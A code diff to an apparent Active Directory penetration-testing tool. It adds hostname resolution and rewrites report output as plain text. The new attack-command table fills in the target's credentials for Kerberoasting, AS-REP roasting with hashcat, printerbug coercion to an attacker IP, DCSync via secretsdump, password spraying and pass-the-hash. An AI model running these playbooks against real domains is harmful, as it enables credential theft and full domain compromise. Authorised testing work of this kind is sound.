@@ -10,12 +10,12 @@ import sys
 import subprocess
 import getpass
 import re
+import socket
 import traceback
 from datetime import datetime
 
 sys.path.insert(0, os.path.dirname(__file__))
 from core.parser import Finding
-from core.report import generate_report1_html, generate_report2_html, generate_markdown, ATTACK_TEMPLATES
 
 # ---------------------------------------------------------------------------
 # Colors
@@ -102,17 +102,34 @@ def wizard():
 
     out_dir = input(f"  {C.CYAN}>{C.RESET} Output directory [{C.DIM}./results{C.RESET}]: ").strip() or "./results"
     os.makedirs(out_dir, exist_ok=True)
-    raw_dir = os.path.join(out_dir, "raw")
+    raw_dir     = os.path.join(out_dir, "raw")
+    reports_dir = os.path.join(out_dir, "reports")
     os.makedirs(raw_dir, exist_ok=True)
+    os.makedirs(reports_dir, exist_ok=True)
+
+    # Resolve DC hostname for tools that need FQDN (e.g. bloodhound-python)
+    dc_hostname = dc_ip
+    try:
+        resolved = socket.gethostbyaddr(dc_ip)[0]
+        if "." in resolved:
+            dc_hostname = resolved
+            _ok(f"Resolved DC hostname: {dc_hostname}")
+    except Exception:
+        pass
+    if dc_hostname == dc_ip:
+        # Try guessing common DC name from domain
+        dc_hostname = f"dc.{domain}"
 
     return {
-        "dc_ip":    dc_ip,
-        "domain":   domain,
-        "user":     user,
-        "password": password,
-        "ntlm":     ntlm,
-        "out_dir":  out_dir,
-        "raw_dir":  raw_dir,
+        "dc_ip":       dc_ip,
+        "dc_hostname": dc_hostname,
+        "domain":      domain,
+        "user":        user,
+        "password":    password,
+        "ntlm":        ntlm,
+        "out_dir":     out_dir,
+        "raw_dir":     raw_dir,
+        "reports_dir": reports_dir,
     }
 
 # ---------------------------------------------------------------------------
@@ -280,7 +297,7 @@ def run_bloodhound(cfg):
         "-d", cfg["domain"],
         "-u", cfg["user"],
         "-ns", cfg["dc_ip"],
-        "-dc", cfg["dc_ip"],
+        "-dc", cfg["dc_hostname"],
         "-c", "All",
         "--zip",
     ]
@@ -425,67 +442,181 @@ def collect_loot(raw, cfg):
     }
 
 # ---------------------------------------------------------------------------
-# Report builder — builds HTML directly without going through core/report
+# Report builder — plain text reports in results/reports/
 # ---------------------------------------------------------------------------
+
+SEV_ORDER = {"CRITICAL": 0, "HIGH": 1, "MEDIUM": 2, "LOW": 3, "INFO": 4}
+
+ATTACK_COMMANDS = {
+    "kerberoastable_users": [
+        "# Request TGS tickets",
+        "impacket-GetUserSPNs {domain}/{user}:{password} -dc-ip {dc_ip} -request -outputfile kerb_hashes.txt",
+        "# Crack offline",
+        "hashcat -m 13100 kerb_hashes.txt /usr/share/wordlists/rockyou.txt",
+    ],
+    "asrep_roastable": [
+        "# Request AS-REP hashes (no pre-auth needed)",
+        "impacket-GetNPUsers {domain}/ -usersfile users.txt -dc-ip {dc_ip} -format hashcat -outputfile asrep_hashes.txt",
+        "# Crack offline",
+        "hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt",
+    ],
+    "unconstrained_delegation": [
+        "# Coerce DC auth with printerbug / PetitPotam",
+        "python3 printerbug.py {domain}/{user}:{password}@{dc_ip} <ATTACKER_IP>",
+        "# Capture TGT with Rubeus (on Windows box with unconstrained deleg)",
+        "Rubeus.exe monitor /interval:5 /filteruser:DC$",
+        "# DCSync after capturing ticket",
+        "Rubeus.exe ptt /ticket:<BASE64_TGT>",
+        "impacket-secretsdump {domain}/{user}@{dc_ip} -just-dc-ntlm",
+    ],
+    "no_lockout": [
+        "# Password spray — no lockout risk",
+        "netexec smb {dc_ip} -u users.txt -p <PASSWORD_CANDIDATE> --continue-on-success",
+        "kerbrute passwordspray -d {domain} --dc {dc_ip} users.txt <PASSWORD_CANDIDATE>",
+    ],
+    "hashes_found": [
+        "# Pass-the-Hash",
+        "netexec smb {dc_ip} -u <USER> -H <NT_HASH>",
+        "impacket-psexec {domain}/<USER>@{dc_ip} -hashes :<NT_HASH>",
+        "evil-winrm -i {dc_ip} -u <USER> -H <NT_HASH>",
+    ],
+    "smb_shares": [
+        "# Mount and browse shares",
+        "netexec smb {dc_ip} -u {user} -p {password} --shares",
+        "smbclient //{dc_ip}/<SHARE> -U '{domain}\\{user}%{password}'",
+    ],
+}
+
+
+def _divider(char="=", width=70):
+    return char * width
+
+
+def _fill_cmd(cmd, cfg):
+    return (cmd
+            .replace("{domain}",   cfg["domain"])
+            .replace("{dc_ip}",    cfg["dc_ip"])
+            .replace("{user}",     cfg["user"])
+            .replace("{password}", cfg.get("password", "<PASSWORD>")))
+
+
 def build_reports(findings, loot, raw, cfg):
-    from core.report import (
-        _summary_bar, _loot_table_html, _finding_card_html,
-        _attack_card_html, _bloodhound_guide_html, HTML_TEMPLATE,
-        _html_escape
-    )
+    reports_dir = cfg["reports_dir"]
+    ts          = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
 
-    out_dir = cfg["out_dir"]
+    # ── Report 1: Findings ────────────────────────────────────────────────
+    lines1 = [
+        _divider(),
+        "  AD RECON — REPORT 1: FINDINGS & INTELLIGENCE",
+        _divider(),
+        f"  Generated : {ts}",
+        f"  Domain    : {cfg['domain']}",
+        f"  DC IP     : {cfg['dc_ip']}",
+        f"  User      : {cfg['user']}",
+        _divider(),
+        "",
+        "SUMMARY",
+        _divider("-"),
+    ]
+    sev_counts = {}
+    for f in findings:
+        sev_counts[f.severity] = sev_counts.get(f.severity, 0) + 1
+    for sev in ["CRITICAL", "HIGH", "MEDIUM", "LOW", "INFO"]:
+        if sev in sev_counts:
+            lines1.append(f"  [{sev}] {sev_counts[sev]} finding(s)")
+    lines1 += [""]
+
+    lines1 += ["INTELLIGENCE LOOT", _divider("-")]
+    loot_fields = [
+        ("Domain Users",       "domain_users"),
+        ("Domain Admins",      "domain_admins"),
+        ("Domain Computers",   "domain_computers"),
+        ("Domain Controllers", "domain_controllers"),
+        ("Kerberoastable",     "kerberoastable"),
+        ("AS-REP Roastable",   "asrep_roastable"),
+        ("SPNs",               "spns"),
+        ("NTLM Hashes",        "hashes_found"),
+        ("Passwords Found",    "passwords_found"),
+        ("Password Policy",    "password_policy"),
+        ("Domain Trusts",      "domain_trusts"),
+        ("GPOs",               "gpos"),
+        ("Interesting Files",  "interesting_files"),
+    ]
+    for label, key in loot_fields:
+        items = loot.get(key, [])
+        if items:
+            lines1.append(f"\n  {label}:")
+            for item in items:
+                lines1.append(f"    - {item}")
+    lines1 += [""]
+
+    lines1 += ["FINDINGS", _divider("-")]
+    for f in sorted(findings, key=lambda x: SEV_ORDER.get(x.severity, 9)):
+        lines1 += [
+            "",
+            f"  [{f.severity}] {f.title}",
+            f"  Category : {f.category}",
+            f"  Tool     : {f.tool}",
+            f"  Details  : {f.description}",
+        ]
+        if f.evidence:
+            lines1.append("  Evidence :")
+            for ev in (f.evidence if isinstance(f.evidence, list) else [f.evidence]):
+                lines1.append(f"    {ev}")
+        lines1.append(_divider("-", 50))
+
+    r1_path = os.path.join(reports_dir, "report1_findings.txt")
+    with open(r1_path, "w", encoding="utf-8") as fh:
+        fh.write("\n".join(lines1))
+
+    # ── Report 2: Attack Commands ─────────────────────────────────────────
+    lines2 = [
+        _divider(),
+        "  AD RECON — REPORT 2: ATTACK COMMANDS",
+        _divider(),
+        f"  Generated : {ts}",
+        f"  Domain    : {cfg['domain']}",
+        f"  DC IP     : {cfg['dc_ip']}",
+        f"  User      : {cfg['user']}",
+        _divider(),
+        "  Legend: [FILLED] = real value inserted  |  <PLACEHOLDER> = you fill this in",
+        _divider(),
+        "",
+    ]
+
+    # BloodHound guide
     raw_dir = cfg["raw_dir"]
-    ts      = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+    zips    = [f for f in os.listdir(raw_dir) if f.endswith(".zip")]
+    lines2 += ["BLOODHOUND", _divider("-")]
+    if zips:
+        lines2 += [
+            f"  ZIP file : {os.path.join(raw_dir, zips[0])}",
+            "  Steps    :",
+            "    1. Open BloodHound GUI",
+            "    2. Click 'Upload Data' -> select the ZIP above",
+            "    3. Run built-in queries: 'Shortest Paths to Domain Admins', 'Kerberoastable Users', etc.",
+        ]
+    else:
+        lines2 += ["  No BloodHound ZIP found — check raw/bloodhound.log"]
+    lines2.append("")
 
-    meta = (f"Generated: {ts} &nbsp;|&nbsp; "
-            f"Domain: <strong>{_html_escape(cfg['domain'])}</strong> &nbsp;|&nbsp; "
-            f"DC: <strong>{_html_escape(cfg['dc_ip'])}</strong> &nbsp;|&nbsp; "
-            f"User: <strong>{_html_escape(cfg['user'])}</strong>")
+    lines2 += ["ATTACK PLAYBOOKS", _divider("-")]
+    matched = [f for f in findings if f.id in ATTACK_COMMANDS]
+    if not matched:
+        lines2.append("  No attack templates matched the findings.")
+    for f in matched:
+        lines2 += [
+            "",
+            f"  [{f.severity}] {f.title}",
+            _divider("-", 50),
+        ]
+        for cmd in ATTACK_COMMANDS[f.id]:
+            lines2.append(f"    {_fill_cmd(cmd, cfg)}")
+        lines2.append("")
 
-    config_for_report = {
-        "target":    {"domain": cfg["domain"], "dc_ip": cfg["dc_ip"]},
-        "auth":      {"username": cfg["user"], "password": cfg["password"], "hash": cfg["ntlm"]},
-        "scope":     {"output_dir": out_dir},
-        "discovery": {"network": {"local_ip": ""}, "user": {"username": cfg["user"]}},
-    }
-
-    # Report 1
-    summary   = _summary_bar(findings)
-    loot_html = _loot_table_html(loot)
-    cards     = "\n".join(_finding_card_html(f) for f in findings)
-
-    body1 = f"<h2>Summary</h2>{summary}\n{loot_html}\n<h2>Findings</h2><p style='color:var(--dim);margin-bottom:16px;'>Click any finding to expand.</p>{cards}"
-    r1_html = HTML_TEMPLATE.format(
-        REPORT_TITLE=_html_escape("Report 1 - Findings & Enumeration"),
-        TIMESTAMP=ts, DOMAIN=_html_escape(cfg["domain"]),
-        DC_IP=_html_escape(cfg["dc_ip"]), USERNAME=_html_escape(cfg["user"]),
-        BODY=body1
-    )
-    r1_path = os.path.join(out_dir, "report1_findings.html")
-    with open(r1_path, "w", encoding="utf-8") as f:
-        f.write(r1_html)
-
-    # Report 2
-    legend = ("<div style='margin-bottom:24px;padding:12px 16px;background:var(--surface);"
-              "border-radius:8px;border:1px solid var(--border);'>"
-              "<strong>Legend:</strong>&nbsp;"
-              "<span style='color:var(--orange);font-weight:700;'>Orange</span> = pre-filled "
-              "&nbsp;|&nbsp; <span style='color:#ff6b6b;'>&lt;PLACEHOLDER&gt;</span> = you fill this in</div>")
-
-    bh_guide     = _bloodhound_guide_html(raw_dir)
-    attack_cards = "\n".join(_attack_card_html(f, config_for_report) for f in findings if f.id in ATTACK_TEMPLATES)
-
-    body2 = f"<h2>BloodHound Data</h2>{bh_guide}<h2>Attack Commands</h2>{legend}{attack_cards}"
-    r2_html = HTML_TEMPLATE.format(
-        REPORT_TITLE=_html_escape("Report 2 - Attack Commands"),
-        TIMESTAMP=ts, DOMAIN=_html_escape(cfg["domain"]),
-        DC_IP=_html_escape(cfg["dc_ip"]), USERNAME=_html_escape(cfg["user"]),
-        BODY=body2
-    )
-    r2_path = os.path.join(out_dir, "report2_attack_commands.html")
-    with open(r2_path, "w", encoding="utf-8") as f:
-        f.write(r2_html)
+    r2_path = os.path.join(reports_dir, "report2_attack_commands.txt")
+    with open(r2_path, "w", encoding="utf-8") as fh:
+        fh.write("\n".join(lines2))
 
     return r1_path, r2_path
 
@@ -529,6 +660,7 @@ def main():
         _section("Done")
         _ok(f"Report 1 (Findings):        {r1}")
         _ok(f"Report 2 (Attack Commands): {r2}")
+        _ok(f"Raw output:                 {cfg['raw_dir']}")
 
         zips = [f for f in os.listdir(cfg["raw_dir"]) if f.endswith(".zip")]
         if zips:
